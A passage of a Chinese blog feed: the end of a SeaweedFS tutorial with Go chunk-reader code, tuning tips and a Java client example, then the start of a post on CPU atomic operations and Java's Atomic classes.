class="number">0</span>).Infof(<span class="string">&quot;delete file %+v: %v&quot;</span>, result.FileId, result.Error)</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;chunk delete %v: %v&quot;</span>, result.FileId, result.Error)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func readChunkNeedle(fileUrl string, w io.Writer, offset int64) (written int64, e error) &#123;</span><br><span class="line">req, <span class="attr">err</span> := http.NewRequest(<span class="string">&quot;GET&quot;</span>, fileUrl, nil)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line"><span class="keyword">return</span> written, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> offset &gt; <span class="number">0</span> &#123;</span><br><span class="line">req.Header.Set(<span class="string">&quot;Range&quot;</span>, fmt.Sprintf(<span class="string">&quot;bytes=%d-&quot;</span>, offset))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, <span class="attr">err</span> := util.Do(req)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line"><span class="keyword">return</span> written, err</span><br><span class="line">&#125;</span><br><span class="line">defer func() &#123;</span><br><span class="line">io.Copy(ioutil.Discard, resp.Body)</span><br><span class="line">resp.Body.Close()</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> resp.StatusCode &#123;</span><br><span class="line"><span class="keyword">case</span> http.StatusRequestedRangeNotSatisfiable:</span><br><span class="line"><span class="keyword">return</span> written, ErrInvalidRange</span><br><span class="line"><span class="keyword">case</span> http.StatusOK:</span><br><span class="line"><span class="keyword">if</span> offset &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> written, ErrRangeRequestsNotSupported</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> http.StatusPartialContent:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> written, fmt.Errorf(<span class="string">&quot;Read chunk needle error: [%d] %s&quot;</span>, resp.StatusCode, fileUrl)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> io.Copy(w, resp.Body)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (cf *ChunkedFileReader) Seek(offset int64, whence int) (int64, error) &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">switch</span> whence &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">offset += cf.pos</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">offset = cf.Manifest.Size - offset</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> offset &gt; cf.Manifest.Size &#123;</span><br><span class="line">err = ErrInvalidRange</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> cf.pos != offset &#123;</span><br><span class="line">cf.Close()</span><br><span class="line">&#125;</span><br><span class="line">cf.pos = offset</span><br><span class="line"><span class="keyword">return</span> cf.pos, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (cf *ChunkedFileReader) WriteTo(w io.Writer) (n int64, err error) &#123;</span><br><span class="line">cm := cf.Manifest</span><br><span class="line">chunkIndex := <span class="number">-1</span></span><br><span class="line">chunkStartOffset := int64(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i, <span class="attr">ci</span> := range cm.Chunks &#123;</span><br><span class="line"><span class="keyword">if</span> cf.pos &gt;= ci.Offset &amp;&amp; cf.pos &lt; ci.Offset+ci.Size &#123;</span><br><span class="line">chunkIndex = i</span><br><span class="line">chunkStartOffset = cf.pos - ci.Offset</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> chunkIndex &lt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> n, ErrInvalidRange</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ; chunkIndex &lt; cm.Chunks.Len(); chunkIndex++ &#123;</span><br><span class="line">ci := cm.Chunks[chunkIndex]</span><br><span class="line"><span class="comment">// if we need read date from local volume server first?</span></span><br><span class="line">fileUrl, <span class="attr">lookupError</span> := LookupFileId(cf.Master, ci.Fid)</span><br><span class="line"><span class="keyword">if</span> lookupError != nil &#123;</span><br><span class="line"><span class="keyword">return</span> n, lookupError</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> wn, <span class="attr">e</span> := readChunkNeedle(fileUrl, w, chunkStartOffset); e != nil &#123;</span><br><span class="line"><span class="keyword">return</span> n, e</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">n += wn</span><br><span class="line">cf.pos += wn</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chunkStartOffset = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (cf *ChunkedFileReader) ReadAt(p []byte, off int64) (n int, err error) &#123;</span><br><span class="line">cf.Seek(off, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> cf.Read(p)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (cf *ChunkedFileReader) Read(p []byte) (int, error) &#123;</span><br><span class="line"><span class="keyword">return</span> cf.getPipeReader().Read(p)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (cf *ChunkedFileReader) Close() (e error) &#123;</span><br><span class="line">cf.mutex.Lock()</span><br><span class="line">defer cf.mutex.Unlock()</span><br><span class="line"><span class="keyword">return</span> cf.closePipe()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (cf *ChunkedFileReader) closePipe() (e error) &#123;</span><br><span class="line"><span class="keyword">if</span> cf.pr != nil &#123;</span><br><span class="line"><span class="keyword">if</span> err := cf.pr.Close(); err != nil &#123;</span><br><span class="line">e = err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cf.pr = nil</span><br><span class="line"><span class="keyword">if</span> cf.pw != nil &#123;</span><br><span class="line"><span class="keyword">if</span> err := cf.pw.Close(); err != nil &#123;</span><br><span class="line">e = err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cf.pw = nil</span><br><span class="line"><span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (cf *ChunkedFileReader) getPipeReader() io.Reader &#123;</span><br><span class="line">cf.mutex.Lock()</span><br><span class="line">defer cf.mutex.Unlock()</span><br><span class="line"><span class="keyword">if</span> cf.pr != nil &amp;&amp; cf.pw != nil &#123;</span><br><span class="line"><span class="keyword">return</span> cf.pr</span><br><span class="line">&#125;</span><br><span class="line">cf.closePipe()</span><br><span class="line">cf.pr, cf.pw = io.Pipe()</span><br><span class="line">go func(pw *io.PipeWriter) &#123;</span><br><span class="line">_, <span class="attr">e</span> := cf.WriteTo(pw)</span><br><span class="line">pw.CloseWithError(e)</span><br><span class="line">&#125;(cf.pw)</span><br><span class="line"><span class="keyword">return</span> cf.pr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">type ChunkInfo struct &#123;</span><br><span class="line">Fid    string <span class="string">`json:&quot;fid&quot;`</span></span><br><span class="line">Offset int64  <span class="string">`json:&quot;offset&quot;`</span></span><br><span class="line">Size   int64  <span class="string">`json:&quot;size&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type ChunkList []*ChunkInfo</span><br><span class="line"></span><br><span class="line">type ChunkManifest struct &#123;</span><br><span class="line">Name   string    <span class="string">`json:&quot;name,omitempty&quot;`</span></span><br><span class="line">Mime   string    <span class="string">`json:&quot;mime,omitempty&quot;`</span></span><br><span class="line">Size   int64     <span class="string">`json:&quot;size,omitempty&quot;`</span></span><br><span class="line">Chunks ChunkList <span class="string">`json:&quot;chunks,omitempty&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在读取Chunk Manifest文件时，SeaweedFS将根据ChunkInfo列表查找并发送数据文件。</p><p><strong>创建新的大文件</strong><br>SeaweedFS将努力委托给客户方。步骤是：</p><p><strong>将大文件拆分成块</strong></p><blockquote><p>像往常一样上传每个文件块，使用mime类型“application / octet-stream”。将相关信息保存到ChunkInfo结构中。每个块可以分布到不同的卷上，可能提供更快的并行访问。<br>使用mime类型“application / json”上传清单文件，并添加url参数“cm = true”。存储清单文件的FileId是大文件的入口点。</p></blockquote><p><strong>更新大文件</strong><br>通常我们只是附加大文件。更新特定的文件块几乎是一样的。<br>附加大文件的步骤：</p><blockquote><p>像往常一样上传新文件块，使用mime类型“application / octet-stream”。将相关信息保存到ChunkInfo结构中。<br>使用mime类型“application / json”更新更新的清单文件，并添加url参数“cm = true”。</p></blockquote><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>以下是优化SeaweedFS的策略或最佳方法。</p><h3 id="使用LevelDB"><a href="#使用LevelDB" class="headerlink" title="使用LevelDB"></a>使用LevelDB</h3><p>启动卷服务器时，可以指定索引类型。默认情况下它使用内存。启动卷服务器时这很快，但启动时间可能很长，以便将文件索引加载到内存中。</p><p><code>weed volume -index=leveldb</code>可以改为leveldb。启动卷服务器要快得多，但访问文件时要慢一点。与网络速度相比，在大多数情况下额外的成本并不是那么多。</p><h3 id="预分配卷文件磁盘空间"><a href="#预分配卷文件磁盘空间" class="headerlink" title="预分配卷文件磁盘空间"></a>预分配卷文件磁盘空间</h3><p>在某些Linux文件系统中，例如XFS，ext4，Btrfs等，SeaweedFS可以选择为卷文件分配磁盘空间。这可以确保文件数据位于连续的块上，这可以在文件很大时提高性能，并且可以覆盖多个扩展区。</p><p>要启用磁盘空间预迁移，请在具有支持文件系统的Linux OS上使用这些选项启动主站。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-volumePreallocate</span><br><span class="line">    Preallocate disk space for volumes.</span><br><span class="line">  -volumeSizeLimitMB uint</span><br><span class="line">    Master stops directing writes to oversized volumes. (default 30000)</span><br></pre></td></tr></table></figure><h3 id="增加并发写入"><a href="#增加并发写入" class="headerlink" title="增加并发写入"></a>增加并发写入</h3><p>默认情况下，SeaweedFS会自动增大卷。例如，对于非复制卷，将同时分配7个可写卷。</p><p>如果要将写入分发到更多卷，可以通过此URL指示SeaweedFS master。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http：&#x2F;&#x2F; localhost：9333 &#x2F; vol &#x2F; grow ？count &#x3D; 12 ＆ replication &#x3D; 001</span><br></pre></td></tr></table></figure><p>这将为12个卷分配001复制。由于001复制意味着相同数据的2个副本，因此实际上将消耗24个物理卷。</p><h3 id="增加并发读取"><a href="#增加并发读取" class="headerlink" title="增加并发读取"></a>增加并发读取</h3><p>与上面相同，更多卷将增加读并发性。</p><p>另外，增加复制也会有所帮助。将相同的数据存储在多个服务器上肯定会增加读取并发性。</p><h3 id="添加更多硬盘"><a href="#添加更多硬盘" class="headerlink" title="添加更多硬盘"></a>添加更多硬盘</h3><p>更多硬盘将为您提供更好的写入/读取吞吐量。</p><h3 id="增加用户打开文件限制"><a href="#增加用户打开文件限制" class="headerlink" title="增加用户打开文件限制"></a>增加用户打开文件限制</h3><p> SeaweedFS通常只打开一些实际的磁盘文件。但是网络文件请求可能超过默认限制，通常默认为1024.对于生产，您需要root权限才能将限制增加到更高的限制，例如“ulimit -n 10240”。</p><h3 id="内存消耗"><a href="#内存消耗" class="headerlink" title="内存消耗"></a>内存消耗</h3><p>对于卷服务器，内存消耗与文件数密切相关。例如，如果每个文件只有20KB，则一个32G卷可以轻松拥有150万个文件。为了将150万个元数据条目存储在内存中，目前SeaweedFS消耗36MB内存，每个内存大约24字节。因此，如果您分配64个卷（2TB），则需要2个卷<del>3GB内存。但是，如果平均文件大小较大，例如200KB，则只有200</del>需要300MB内存。</p><p>SeaweedFS还具有leveldb，boltdb和btree模式支持，可以进一步降低内存消耗。</p><p>要使用它，“weed server -volume.index = [memory | leveldb | boltdb | btree]”或“weed volume -index = [memory | leveldb | boltdb | btree]”。您可以随时尽可能在4种模式之间切换。如果leveldb或boltdb的文件已过期或缺失，将根据需要重新生成它们。</p><p>boltdb的编写速度相当慢，大约需要6分钟来重建1553934文件的索引。Boltdb从磁盘加载1,553,934 x 16 = 24,862,944bytes，并在6分钟内生成大小为134,217,728字节的boltdb。为了进行比较，leveldb在8秒内重新创建了大到27,188,148字节的索引。</p><p>要测试内存消耗，请创建leveldb或boltdb索引。基准集合中共有7卷，每卷约有1553K个文件。服务器重新启动，然后我启动基准测试工具来读取大量文件。对于leveldb，服务器内存从142,884KB开始，并保持在179,340KB。对于boltdb，服务器内存从73,756KB开始，并保持在144,564KB。对于内存，服务器内存从368,152KB开始，并保持在448,032KB。</p><p>为了测试写入速度，我使用带有默认参数的基准测试工具。对于boltdb，写入大约是4.1MB / s，4.1K文件/ s对于leveldb，写入大约是10.4MB / s，10.4K文件/ s对于内存来说，它更快一点，没有统计差异。但我使用SSD，而os缓冲区缓存也会影响数字。所以你的结果可能会有所不同。</p><p>在v0.75中添加了Btree模式，以优化无序自定义文件密钥的内存。对于SeaweedFS主服务器分配的普通文件密钥，Btree模式可能会花费更多内存，但通常比自定义文件密钥更有效。请测试你的病例。</p><p>注意：BoltDB的限制是32位系统上的最大db大小为256MB。</p><h3 id="使用您自己的密钥插入"><a href="#使用您自己的密钥插入" class="headerlink" title="使用您自己的密钥插入"></a>使用您自己的密钥插入</h3><p>文件ID生成实际上非常简单，您可以使用自己的方式生成文件密钥。</p><p>文件密钥有3个部分：</p><blockquote><ul><li>volume id：具有可用空间的卷</li></ul><ul><li>针头ID：单调增加且唯一的数字</li></ul><ul><li>文件cookie：随机数，您可以以任何方式自定义它</li></ul></blockquote><p>您可以直接要求主服务器分配文件密钥，并将针ID部分替换为您自己的唯一ID，例如用户ID。</p><p>您还可以从服务器状态获取每个卷的可用空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl “ http：&#x2F;&#x2F; localhost：9333 &#x2F; dir &#x2F; status？pretty &#x3D; y ”</span><br></pre></td></tr></table></figure><p>一旦确定了无空间空间，就可以使用自己的文件ID。只需要确保文件密钥格式兼容。</p><p>指定的文件cookie也可以自定义。</p><p>自定义针ID和/或文件cookie是可接受的行为。“严格单调增加”不是必需的，但是为了保持存储器数据结构的有效性，期望保持文件id以“大多数”增加的顺序。</p><h3 id="上传大文件"><a href="#上传大文件" class="headerlink" title="上传大文件"></a>上传大文件</h3><p>如果文件很大且网络很慢，服务器将花费时间来读取文件。请增加卷服务器的“-readTimeout = 3”限制设置。如果上传时间超过限制，则会切断连接。</p><p><strong>使用“自动拆分/合并”上载大型文件</strong><br>如果文件很大，最好以这种方式上传：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weed upload -maxMB &#x3D; 64 the_file_name</span><br></pre></td></tr></table></figure><p>这会将文件拆分为每个64MB的数据块，并单独上传。所有数据块的文件ID都保存到另一个元块中。返回元块的文件ID。<br>下载文件时，只需</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weed download the_meta_chunk_file_id</span><br></pre></td></tr></table></figure><p>元块具有文件ID列表，每行上有每个文件ID。因此，如果要并行处理它们，可以下载元块并直接处理每个数据块。</p><h3 id="集合作为简单名称空间"><a href="#集合作为简单名称空间" class="headerlink" title="集合作为简单名称空间"></a>集合作为简单名称空间</h3><p>分配文件ID时，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;master:9333&#x2F;dir&#x2F;assign?collection&#x3D;pictures</span><br><span class="line">curl http:&#x2F;&#x2F;master:9333&#x2F;dir&#x2F;assign?collection&#x3D;documents</span><br></pre></td></tr></table></figure><p>如果尚未创建“图片”集合和“文档”集合，也会生成它们。每个集合都有其专用卷，并且它们不会共享相同的卷。<br>实际上，实际数据文件具有集合名称作为前缀，例如“pictures_1.dat”，“documents_3.dat”。</p><h2 id="Java操作SeaweedFS"><a href="#Java操作SeaweedFS" class="headerlink" title="Java操作SeaweedFS"></a>Java操作SeaweedFS</h2><p>首先导入pom依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.anumbrella.seaweedfs<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seaweedfs-java-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写SeaweedFS配置类SeaweedFSConfig</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SeaweedFSConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;seaweedfs.host&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String host;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;seaweedfs.port&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FileTemplate <span class="title">fileTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        FileSource fileSource = <span class="keyword">new</span> FileSource();</span><br><span class="line">        <span class="comment">// SeaweedFS master服务ip地址</span></span><br><span class="line">        fileSource.setHost(host);</span><br><span class="line">        <span class="comment">// SeaweedFS master服务端口</span></span><br><span class="line">        fileSource.setPort(port);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 启动服务</span></span><br><span class="line">            fileSource.startup();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FileTemplate(fileSource.getConnection());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我的application.properties配置文件如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seaweedfs.host=192.168.6.224 #多个ip地址用逗号隔开</span><br><span class="line">seaweedfs.port=9333</span><br></pre></td></tr></table></figure><p>上传文件的方法如下,用的是Spring的JUnit测试:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> FileTemplate template;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSeaweedFS</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 上传可以指定文件名</span></span><br><span class="line">        FileHandleStatus handleStatus = template.saveFileByStream(<span class="string">&quot;file.type&quot;</span>, <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">&quot;filePath&quot;</span>)));</span><br><span class="line">        <span class="comment">// 获取文件ID,可通过这个ID获取到文件</span></span><br><span class="line">        String fileId = handleStatus.getFileId();</span><br><span class="line">        StreamResponse fileStream = template.getFileStream(fileId);</span><br><span class="line">        InputStream inputStream = fileStream.getInputStream();</span><br><span class="line">        <span class="comment">// 获取流之后流拷贝输出到本地</span></span><br><span class="line">        IOUtils.copy(inputStream,<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">&quot;outPath&quot;</span>)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SeaweedFS </tag>
            
            <tag> 分布式文件系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并发编程之Atomic&amp;Unsafe魔法类详解</title>
      <link href="/AtomicUnsafe/"/>
      <url>/AtomicUnsafe/</url>
      
        <content type="html"><![CDATA[<p>并发编程之Atomic&amp;Unsafe魔法类详解–原子（atom）本意是“不能被进一步分割的最小粒子”，而原子操作（atomic operation）意为”不可被中断的一个或一系列操作”。在多处理器上实现原子操作就变得有点复杂。本文让我们一起来聊一聊在Inter处理器和Java里是如何实现原子操作的。</p> <a id="more"></a><h1 id="并发编程之Atomic-amp-Unsafe魔法类详解"><a href="#并发编程之Atomic-amp-Unsafe魔法类详解" class="headerlink" title="并发编程之Atomic&amp;Unsafe魔法类详解"></a>并发编程之Atomic&amp;Unsafe魔法类详解</h1><h2 id="一、什么是原子操作？"><a href="#一、什么是原子操作？" class="headerlink" title="一、什么是原子操作？"></a>一、什么是原子操作？</h2><p>原子（atom）本意是“不能被进一步分割的最小粒子”，而原子操作（atomic operation）意为”不可被中断的一个或一系列操作”。在多处理器上实现原子操作就变得有点复杂。本文让我们一起来聊一聊在Inter处理器和Java里是如何实现原子操作的。</p><p><strong>1、相关术语</strong></p><table><thead><tr><th>术语名称</th><th>英文</th></tr></thead><tbody><tr><td>缓存行</td><td>Cache line</td></tr><tr><td>比较并交换</td><td>Compare and Swap</td></tr><tr><td>CPU流水线</td><td>CPU pipeline</td></tr><tr><td>内存顺序冲突</td><td>Memory order violation</td></tr></tbody></table><h2 id="二、CPU原子操作的实现方式"><a href="#二、CPU原子操作的实现方式" class="headerlink" title="二、CPU原子操作的实现方式"></a>二、CPU原子操作的实现方式</h2><p>32位IA-32处理器使用基于对缓存加锁或总线加锁的方式来实现多处理器之间的原子操作。</p><p><strong>1、处理器自动保证基本内存操作的原子性</strong></p><p>首先处理器会自动保证基本的内存操作的原子性。处理器保证从系统内存当中读取或者写入一个字节是原子的，意思是当一个处理器读取一个字节时，其他处理器不能访问这个字 节的内存地址。奔腾6和最新的处理器能自动保证单处理器对同一个缓存行里进行16/32/64位的操作是原子的，但是复杂的内存操作处理器不能自动保证其原子性，比如跨总线宽度， 跨多个缓存行，跨页表的访问。但是处理器提供总线锁定和缓存锁定两个机制来保证复杂内存操作的原子性。</p><p><strong>2、使用总线锁保证原子性</strong></p><p>第一个机制是通过总线锁保证原子性。如果多个处理器同时对共享变量进行读改写（i++就是经典的读改写操作）操作，那么共享变量就会被多个处理器同时进行操作，这样读改写操作就不是原子的，操作完之后共享变量的值会和期望的不一致，举个例子：如果i=1,我们进行两次i++操作，我们期望的结果是3，但是有可能结果是2。</p><p>如下图</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816141731.png" alt="微信截图_20190816141731"></p><p>原因是有可能多个处理器同时从各自的缓存中读取变量i，分别进行加一操作，然后分别写入系统内存当中。那么想要保证读改写共享变量的操作是原子的，就必须保证CPU1读 改写共享变量的时候，CPU2不能操作缓存了该共享变量内存地址的缓存。</p><p><em>处理器使用总线锁就是来解决这个问题的</em>。所谓总线锁就是使用处理器提供的一个LOCK＃信号，当一个处理器在总线上输出此信号时，其他处理器的请求将被阻塞住,那么该 处理器可以独占使用共享内存。</p><p><strong>3、使用缓存锁保证原子性</strong></p><p>第二个机制是通过缓存锁定保证原子性。在同一时刻我们只需保证对某个内存地址的操作是原子性即可，但总线锁定把CPU和内存之间通信锁住了，这使得锁定期间，其他处理器不能操作其他内存地址的数据，所以总线锁定的开销比较大，最近的处理器在某些场合下使用缓存锁定代替总线锁定来进行优化。</p><p>频繁使用的内存会缓存在处理器的L1，L2和L3高速缓存里，那么原子操作就可以直接在处理器内部缓存中进行，并不需要声明总线锁，在奔腾6和最近的处理器中可以使用“缓存锁定”的方式来实现复杂的原子性。所谓“缓存锁定”就是如果缓存在处理器缓存行中内存区域在LOCK操作期间被锁定，当它执行锁操作回写内存时，处理器不在总线上声言LOCK＃信号，而是修改内部的内存地址，并允许它的缓存一致性机制来保证操作的原子性，因为缓存一致性机制会阻止同时修改被两个以上处理器缓存的内存区域数据，当其他处理器回写已被锁定的缓存行的数据时会起缓存行无效，在例1中，当CPU1修改缓存行中的i时使用缓存锁定，那么CPU2就不能同时缓存了i的缓存行。</p><p><em>但是有两种情况下处理器不会使用缓存锁定</em>。第一种情况是：当操作的数据不能被缓存在处理器内部，或操作的数据跨多个缓存行（cache line），则处理器会调用总线锁定。第二种情况是：有些处理器不支持缓存锁定。对于Inter486和奔腾处理器,就算锁定的内存区域在处理器的缓存行中也会调用总线锁定。</p><p>以上两个机制我们可以通过Inter处理器提供了很多LOCK前缀的指令来实现。比如位测试和修改指令BTS，BTR，BTC，交换指令XADD，CMPXCHG和其他一些操作数和逻辑指令，比如ADD（加），OR（或）等，被这些指令操作的内存区域就会加锁，导致其他处理器不能同时访问它。</p><p><strong>4、Java当中如何实现原子操作</strong></p><p>在java中可以通过锁和循环CAS的方式来实现原子操作。</p><p>JVM中的CAS操作正是利用了上文中提到的处理器提供的CMPXCHG指令实现的。自旋CAS实现的基本思路就是循环进行CAS操作直到成功为止，具体的类可以参见juc下的atomic包内的原子类。</p><h2 id="三、Atomic"><a href="#三、Atomic" class="headerlink" title="三、Atomic"></a>三、Atomic</h2><p>在Atomic包里一共有12个类，四种原子更新方式，分别是原子更新基本类型，原子更新数组，原子更新引用和原子更新字段。Atomic包里的类基本都是使用Unsafe实现的包装类。</p><ul><li>基本类：AtomicInteger、AtomicLong、AtomicBoolean；</li><li>引用类型：AtomicReference、AtomicReference的ABA实例、AtomicStampedRerence、AtomicMarkableReference；</li><li>数组类型：AtomicIntegerArray、AtomicLongArray、AtomicReferenceArray；</li><li>属性原子修改器（Updater）：AtomicIntegerFieldUpdater、AtomicLongFieldUpdater、AtomicReferenceFieldUpdater；</li></ul><p><strong>1、原子更新基本类型类</strong></p><p>用于通过原子的方式更新基本类型，Atomic包提供了以下三个类：</p><ul><li>AtomicBoolean：原子更新布尔类型。</li><li>AtomicInteger：原子更新整型。</li><li>AtomicLong：原子更新长整型。</li></ul><p>AtomicInteger的常用方法如下：</p><ul><li>int addAndGet(int delta)：以原子方式将输入的数值与实例中的值（AtomicInteger里的value）相加，并返回结果</li><li>boolean compareAndSet(int expect,int update)：如果输入的数值等于预期值，则以原子方式将该值设置为输入的值。</li><li>int getAndIncrement()：以原子方式将当前值加1，注意：这里返回的是自增前的值。</li><li>void lazySet(int newValue)：最终会设置成newValue，使用lazySet设置值后，可能导致其他线程在之后的一小段时间内还是可以读到旧的值。</li><li>int getAndSet(int newValue)：以原子方式设置为newValue的值，并返回旧值。</li></ul><p>Atomic包提供了三种基本类型的原子更新，但是Java的基本类型里还有char，float和double等。那么问题来了，如何原子的更新其他的基本类型呢？Atomic包里的类基本都是 使用Unsafe实现的，Unsafe只提供了三种CAS方法，compareAndSwapObject，compareAndSwapInt和compareAndSwapLong，再看AtomicBoolean源码，发现其是 